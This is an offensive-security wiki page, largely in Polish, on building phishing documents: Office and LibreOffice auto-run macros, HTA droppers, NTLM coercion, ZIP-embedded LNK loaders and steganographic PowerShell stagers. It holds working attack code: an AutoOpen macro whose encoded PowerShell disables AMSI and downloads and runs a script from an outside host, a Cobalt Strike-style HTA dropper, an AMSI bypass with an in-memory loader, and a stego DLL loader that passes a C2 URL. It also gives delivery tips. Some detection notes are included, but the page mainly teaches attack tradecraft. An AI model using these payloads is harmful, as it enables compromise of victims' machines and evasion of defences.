# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli wystąpi błąd podczas identyfikacji struktury danych, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia i zachowanie możliwości wykonania makr.\
Na przykład plik RTF z definicji nie obsługuje makr, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie mógł wykonywać makra.\
Te same mechanizmy i wewnętrzne struktury dotyczą całego oprogramowania pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą uruchamiane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go) który zawiera macros mogą również “execute” macros.

### Zewnętrzne ładowanie obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Kategorie**: Links and References, **Nazwy pól**: includePicture, oraz **Nazwa pliku lub URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Możliwe jest użycie macros do run arbitrary code z dokumentu.

#### Funkcje autoload

Im bardziej powszechne są, tym bardziej prawdopodobne, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz z rozwijanego menu **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie można zapisać macros wewnątrz `.docx`** i wokół macro-enabled rozszerzenia **`.docm`** panuje stygmat (np. miniaturka ma ogromne `!` i niektóre bramki web/email całkowicie je blokują). Dlatego to **legacy `.doc` rozszerzenie jest najlepszym kompromisem**.

#### Generatory złośliwych macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Dokumenty LibreOffice Writer mogą osadzać Basic macros i automatycznie je wykonywać po otwarciu pliku poprzez powiązanie macro z eventem **Open Document** (Tools → Customize → Events → Open Document → Macro…). Prosty reverse shell macro wygląda tak:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu – LibreOffice Basic używa ich do oznaczania dosłownych cudzysłowów, więc payloads, które kończą się na `...==""")`, zachowują równowagę zarówno wewnętrznego polecenia, jak i argumentu Shell.

Delivery tips:

- Zapisz jako `.odt` i powiąż macro ze zdarzeniem dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Przy wysyłaniu e-maili za pomocą `swaks`, użyj `--attach @resume.odt` (znak `@` jest wymagany, aby przesyłane były bajty pliku, a nie łańcuch nazwy pliku). Jest to krytyczne przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez walidacji.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja "w pełni zaufana", bez ograniczeń modelu zabezpieczeń przeglądarki.

HTA jest uruchamiane przy użyciu **`mshta.exe`**, które zwykle jest **instalowane** wraz z **Internet Explorer**, co sprawia, że **`mshta` zależy od IE**. Jeśli więc IE został odinstalowany, HTA nie będą mogły zostać uruchomione.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM „zdalnie”**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, do których użytkownik uzyska dostęp (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnienie** już przy **otwarciu folderu.**

**Sprawdź te pomysły i więcej na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Nie zapomnij, że możesz nie tylko ukraść hasha lub uwierzytelnienia, ale także **przeprowadzić NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Bardzo skuteczne kampanie dostarczają ZIP zawierający dwa legalne dokumenty przynętowe (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że rzeczywisty PowerShell loader jest przechowywany w surowych bajtach ZIP-a po unikalnym markerze, a .lnk wydziela go i uruchamia w całości w pamięci.

Typowy przebieg realizowany przez .lnk PowerShell one-liner:

1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź twardo zakodowany marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.
3) Skopiuj ZIP do %ProgramData%, wypakuj go tam i otwórz przynętowy .docx, aby wyglądało to na legalne.
4) Omijanie AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskacja następnego etapu (np. usuń wszystkie znaki #) i wykonanie go w pamięci.

Przykładowy szkielet PowerShell do wydzielenia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Etap dostarczenia często nadużywa zaufanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwować nieszkodliwe ZIPy w zależności od IP/UA).
- Następny etap często deszyfruje base64/XOR shellcode i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Uwagi
- To jest ATT&CK T1027.003 (steganography/marker-hiding). Markery różnią się między kampaniami.
- AMSI/ETW bypass and string deobfuscation są często stosowane przed załadowaniem assembly.
- Wykrywanie: przeskanuj pobrane obrazy w poszukiwaniu znanych delimiterów; zidentyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący bloby Base64.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzającym się wstępnym etapem jest mały, silnie‑obfuskowany `.js` lub `.vbs` dostarczony wewnątrz archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass` w celu bootstrapowania następnego etapu przez HTTPS.

Szkielet logiki (abstrakt):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 pomiędzy zbędnymi ciągami
- Zdekoduj do ASCII PowerShell
- Uruchom za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do wykrywania
- Załączniki JS/VBS w archiwum uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w linii poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` z ścieżek tymczasowych użytkownika.

## Pliki Windows do kradzieży hashów NTLM

Sprawdź stronę dotyczącą **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referencje

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
